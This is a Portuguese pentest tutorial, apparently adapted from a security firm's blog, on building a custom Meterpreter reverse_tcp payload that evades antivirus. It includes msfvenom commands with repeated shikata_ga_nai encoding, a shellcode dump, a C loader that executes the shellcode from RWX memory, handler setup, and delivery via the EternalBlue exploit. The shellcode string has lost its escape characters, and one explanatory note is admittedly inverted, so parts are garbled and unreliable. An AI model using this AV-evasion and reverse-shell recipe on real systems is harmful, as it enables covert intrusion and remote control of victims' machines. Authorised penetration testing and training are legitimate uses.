## Evitando Antivírus com Melhores Cargas Úteis do Meterpreter (custom payload Meterpreter)

Evitar antivírus é frequentemente uma arte pouco valorizada que pode fazer ou fracassar um teste de penetração. Produtos antivírus modernos podem detectar facilmente cargas úteis meterpreter e podem deixar um pentester acreditando falsamente que um sistema não é explorável.
Para aumentar nossa taxa geral de sucesso de exploração, criaremos um meterpreter personalizado reverse_tcp carga útil.
Para isso, primeiro precisaremos de algumas coisas:
Comunidade Visual Studio 2019 (Grátis): https://visualstudio.microsoft.com/downloads/ Metasploit Framework: https://github.com/rapid7/metasploit-framework

## TLDR

Vamos criar shellcode com msfvenom, codificar, colar em um template personalizado e entregar o binário compilado como um payload personalizado com metasploit.

## Shellcode do Windows: x86 ou x64?

Há alguns anos, era muito comum que binários x64 passassem despercebidos pelo Windows Defender, porém os produtos antivírus melhoraram muito recentemente e começaram a detectar cargas úteis de x64 meterpreter que testamos. poucos codificadores suportam shellcode x64, o que reduz ainda mais nossa capacidade de criar cargas furtivas. Em nossos testes, descobrimos que construir cargas úteis x86 com o shikata_ga_nai resistiu ao maior teste do tempo e ainda consegue evitar a maioria dos motores AV.

## Qual carga útil Meterpreter escolher?

Você pode visualizar uma lista de cargas úteis executando , nós usaremos o **reverse_tcp** estagio Carga Útil: `msfvenom -l payloads`

```bash
windows/meterpreter/reverse_tcp            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
```

>Nota: a carga útil selecionada `windows/meterpreter_reverse_tcp` é consideravelmente diferente da carga útil `windows/meterpreter/reverse_tcp`. A segunda indica que a segunda não está em estágio" (explicação invertida) e se conectará de volta ao nosso manipulador para entregar toda a carga útil do meterpreter

- `windows/meterpreter/reverse_tcp` = **staged** (primeiro um stager pequeno, depois baixa o resto)
- `windows/meterpreter_reverse_tcp` = **stageless** (payload completo em um único bloco)

## Shellcode Encoder

Você pode visualizar todos os codificadores disponíveis executando `msfvenom -l encoders`. Vemos o maior sucesso usando várias iterações com x86/shikata_ga_nai.

```bash
x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```

## Criando o shellcode com o Msfvenom

Agora usaremos o msfvenom para exportar o payload reverse_tcp como shellcode codificado. Você precisará mudar o IP e a porta para o do seu ouvinte. Você também pode querer alterar o número de iterações (-i 8), Usar até 25 deve ser seguro na maioria das situações:

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=9090 -e x86/shikata_ga_nai -i 8 -f c > shell.c

# -i 8 = 8 iterações de codificação (recomendado: 5-15 para equilíbrio entre evasão e estabilidade)
```

Na saída disso, nos interessamos pela linha, neste exemplo temos `557 bytes` no tamanho da carga útil:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 1 compatible encodersAttempting to encode payload with 8 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 368 (iteration=0)x86/shikata_ga_nai succeeded with size 395 (iteration=1)x86/shikata_ga_nai succeeded with size 422 (iteration=2)x86/shikata_ga_nai succeeded with size 449 (iteration=3)x86/shikata_ga_nai succeeded with size 476 (iteration=4)x86/shikata_ga_nai succeeded with size 503 (iteration=5)x86/shikata_ga_nai succeeded with size 530 (iteration=6)x86/shikata_ga_nai succeeded with size 557 (iteration=7)x86/shikata_ga_nai chosen with final size 557Payload size: 557 bytesFinal size of c file: 2366 bytes
```

Em nossa saída, temos o seguinte shellcode: `shell.c`

```c

unsigned char buf[] ="xdbxddxd9x74x24xf4x5ax31xc9xbbx3bxe2xb0xc9xb1""x85x31x5ax19x03x5ax19x83xeaxfcxd9x17x0dxc1xab""x37x0ax09x07x1exa7x89x53xfbx61x1bx2ax82x40xf1""x59xf8x61x01x62x94x74xe8x99x05x5bx51xe8x63xe4""x2ax87xccxeaxfbx81x45x6bx9axbdx83x08x50xdex32""x65x18x9cx35x5bx77x9ax64xeax8fxfax13x1fx28xe1""xb9xfdxe2x22xbax07xd5xe0x74xeaxb8x9cx81x28x24""x11x81x75x4cxcax2bx53x3fx7exa4x88xf8xaax76x43""x4dxecx6dxcaxf9xd8x3fxf6x11xdex11xc3x16x02xa5""x04x32x29x21xc9x4exdfxa8xcfxdcxd7x81x91xcex08""x3bxf8x72xc1xcax3cx89xeexcdx89xabxa2xcfx82x5d""xdfx24xc9xdbx19x83xa6x73xffxa9xe4xcex23x0exf2""x5ax1bx49x6fx5cx32xa1x17xc6x6ax83xfbxb1x61x3c""x63x1fx31xa8x1ex53x68x3axe0xe5x17xb6x02x37x3e""xa2xbbxb0xe1xb8x54x73xf2x17xc6xadxe2x0dxb0x84""x56x54x82x23x79x1fx4exeex94x8fx3axe1x10x06x45""xf9xb9x8ax65xfdx02xc9x07xcexb4x61x92x74xdfx14""x47x19x51xe4x9dxd8xa8x13xbfx50x5bxf9x1ex2dx48""x8ex2fx12x43x44x1fx9axe1x53xffx0bx33xd8x66xbc""xf2xfcxc9x51xbdx2ax19xe9xd5xbcx9ex5fx72xcfx8a""x81x42x1cxd8x0ex8cxedx75xfex7ax5dx72xffx81x09""xa4x1bx91x74x31x32xc5xd3x7bxd0xd3x58x2ax61xc0""xddx2axdcxe5x84x8dx75x99xf8x66xccx72xdcx55x98""x40xcfxc3xcfxdbx02x61x0cxd9xa4xf0x20xcfxdbx3f""x1cx54x05x4dxe6xf1x3axd2x5bx0cx4bx52x6ex0cxfe""xeex89x4ex4cx17x55xc7x42x3exfdx8axafxdfxe5x69""xc9x10x48xc6xabx85x41x23x4axbexc4x85x27x5ex74""xa8xc3x9bx3fx24xccx4ex0fxe0x54x26x0ax95x12x97""x61x8dxa8x90x95x1dx40x29x0cx9axf8xcfx35x2fx64""x27xc4x75x2ex13x7ax12x7cx46x83xd6xcfx18x41x1e""x03x74xb6xc7x90x7ex22x72xfcx59x67x84xb5xe6x3e""x47xcdxbbxa2xabxa3xb4xfexc2x6fx38x49xf9xecx59""x81x15x7bx10xc0x3bx05xe1x5cxacx08x85x2fx3fx90""x29x2excdxaax4ex6fx9fx9cxe9x97x96x3fxb0xd4xc1""x64x22x20xe5xdcx5ax0fx7fx77x37xd1x51x77xa4x10""xedx58xd0xbbx62xa9x8fx30x8exa1x1dx0dx73x3dx3f""xcbxf4xfex06x81xc6xf2x03xc7x22xf0xebx0ex61xe6""x5cxc5";

```

## Crie um Projeto Visual Studio

Abra o Visual Studio e pressione "Criar um novo projeto":

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-project-768x436.png" />

selecione “Empty project”:

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-empty-proect-768x246.png" />

Escolha o nome do projeto e pressione “Create”:

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/create-project-768x502.png" />

em Arquivos Fonte “Source Files” clique com o botão direito para adicionar um Novo item em “New item”:

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-new-item-768x383.png" />

Selecione o arquivo cpp e nomeie como “main.cpp”:

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/add-main-768x533.png" />

## Crie um modelo personalizado

No seu arquivo `main.cpp`, colaremos o seguinte código:

```
#include <stdio.h>
#include <windows.h>

unsigned const char payload[] = "";
size_t size = 0;

int main(int argc, char** argv){
    char* code;
    printf("This is just a random string!\n");
    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    memcpy(code, payload, size);
    ((void(*)())code)();
    return(0);}
```

### Só precisamos mudar duas coisas:

1: Adicionar o número "Tamanho da carga útil `Payload size`" (não usar o "Tamanho final do arquivo c `Final size of c file`") de quando geramos a carga útil. Neste caso, eram `557 bytes`:

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/payload-size.png" />

Substitua o marcador de posição em **payload[]** pelo *shellcode* gerado em **buf[]**:

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/shellcode.png" />

Adicione algum texto aleatório para que não todos usemos as mesmas assinaturas!

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/random-string-768x128.png" />

No menu suspenso da build, selecione release:

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-release-768x159.png" />

Aperte `Ctrl+B` e sua carga deve estar pronta!

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/project-executable.png" />

>Nota: Se você encontrar erros em relação a `vcruntime140.dll` o sistema pode não ter o Visual Studio Runtime instalado; Você pode encontrar isso em servidores minimalistas. Para evitar isso, você pode ir até Propriedades do Projeto e mudar a biblioteca de runtime, o que criará um binário ligado estaticamente. No entanto, esse será um binário maior e muito mais propenso à detecção por antivirus. Use isso apenas como último recurso! `Multi-threaded (/MT)`

<img src="https://www.virtuesecurity.com/wp-content/uploads/2020/02/static-linked-payload-768x256.png" />

## Iniciando um manipulador de meterpreter
No nosso sistema de ataque, agora criaremos um manipulador para aceitar conexões recebidas do nosso payload. Devemos garantir que o IP e a porta sejam os mesmos usados nas etapas anteriores:

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set LHOST 10.0.0.5
LHOST => 10.0.0.5

msf5 exploit(multi/handler) > set LPORT 9090
LPORT => 9090

msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.0.0.5:9090
```

Para lançar nosso novo payload brilhante como parte de um exploit, podemos usar o payload e especificar o nome do nosso binário: `generic/custom`

```
msf5 > use windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload generic/custom
payload => generic/custom

msf5 exploit(windows/smb/ms17_010_eternalblue) > set payloadfile /home/demo/Project1.exe
payloadfile => /home/demo/Project1.exe

msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.0.30
RHOSTS => 10.0.0.30

msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

> O processo também funciona com VS 2022 (testado). 
> Certifique-se de instalar a carga de trabalho "Desenvolvimento para desktop com C++".

## ⚠️ Aviso Legal:
Este conteúdo é exclusivamente para fins educacionais e testes de penetração com autorização prévia. O uso não autorizado é ilegal e de responsabilidade do usuário.
